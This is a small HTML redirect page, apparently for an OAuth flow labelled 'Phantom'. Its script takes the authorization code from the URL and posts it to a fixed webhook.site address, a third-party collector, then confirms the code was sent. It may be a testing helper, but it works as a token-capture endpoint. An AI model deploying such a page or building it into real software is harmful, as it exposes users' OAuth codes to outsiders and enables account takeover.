
<!DOCTYPE html>
<html>
  <head>
    <title>Phantom OAuth Redirect</title>
    <script>
      const params = new URLSearchParams(window.location.search);
      const code = params.get("code");

      if (code) {
        fetch("https://webhook.site/570e225d-7edc-47b3-8629-dd5255aace1c", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ code })
        }).then(() => {
          document.body.innerText = "✅ Code sent to webhook!";
        });
      } else {
        document.body.innerText = "❌ No code found.";
      }
    </script>
  </head>
  <body>
    Waiting for code...
  </body>
</html>
